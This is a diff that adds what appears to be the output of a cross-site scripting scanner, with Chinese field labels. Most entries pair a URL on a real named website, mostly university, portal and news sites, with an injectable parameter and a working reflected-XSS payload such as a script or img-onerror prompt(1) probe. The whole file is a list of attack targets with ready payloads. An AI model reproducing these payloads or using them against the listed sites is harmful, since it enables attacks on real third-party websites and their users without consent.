@@ -1,0 +1,70 @@
+检测网址 : http://ss.knet.cn/verifyseal.dll?ct=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&sn=e16092811010564769ofx2000000&a=1&pa=0.20834604078659558
+提交方式 : POST
+漏洞参数 : ct
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://mytube.ncku.edu.tw/media.php?id=</script>"><script>prompt(1)</script>3857
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://passport.baike.com/user/qiye/register.jsp?autourl=</script>"><script>prompt(1)</script>http://qiye.baike.com/qiyeDocCategory.do?action=showFirstCategory
+提交方式 : GET
+漏洞参数 : autourl
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://mytube.ncku.edu.tw/media.php?id=</script>"><script>prompt(1)</script>3857
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://cme.ncu.edu.tw/index.php?apps= and 1=2 <script>alert(1)</script>news&action=more&id=1407
+提交方式 : GET
+漏洞参数 : apps
+攻击载荷 :  and 1=2 <script>alert(1)</script>
+------------------------------------
+检测网址 : http://dkhl.nuk.edu.tw/main.php?mod="><img src=x onerror=prompt(1)>link_cooljs_menu&func=show_link&menu_id=10&mod_index=1&site_id=0
+提交方式 : GET
+漏洞参数 : mod
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------------------------
+检测网址 : http://www1.resset.cn:8080/product/index.jsp?actionResult=</script>"><script>prompt(1)</script>USER_LOGIN_IP_RESTRICT&loginName=fzfu
+提交方式 : GET
+漏洞参数 : actionResult
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://jy.sstvc.com/company/college/resumedetail.aspx?rid=</script>"><script>prompt(1)</script>350e1c34-69c0-41a9-b0e3-ebb46616f4cd
+提交方式 : GET
+漏洞参数 : rid
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://passport.baike.com/user/qiye/register.jsp?autourl=</script>"><script>prompt(1)</script>http://qiye.baike.com/qiyeDocCategory.do?action=showFirstCategory
+提交方式 : GET
+漏洞参数 : autourl
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://sxjrzyxy.cnxincai.com/admin/login/enterpriseLogin?sId=</script>"><script>prompt(1)</script>7f4e18a7d14b432f9261b72d94e863e2
+提交方式 : GET
+漏洞参数 : sId
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://french2.nccu.edu.tw/dA_bdl.php?ym="><img src=x onerror=prompt(1)>2012/10
+提交方式 : GET
+漏洞参数 : ym
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------------------------
+检测网址 : https://mail.sina.net/huodong/selfservice/index.php?s=</script>"><script>prompt(1)</script>50b8e1367fa890d8b9a7e18ace84cb17356e652f_174
+提交方式 : GET
+漏洞参数 : s
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://www.sdaxue.com/guide.html?d=</script>"><script>prompt(1)</script>60
+提交方式 : GET
+漏洞参数 : d
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://ent.sina.com.cn/ku/tv_search_index.d.html?years=</script>"><script>prompt(1)</script>0
+提交方式 : GET
+漏洞参数 : years
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
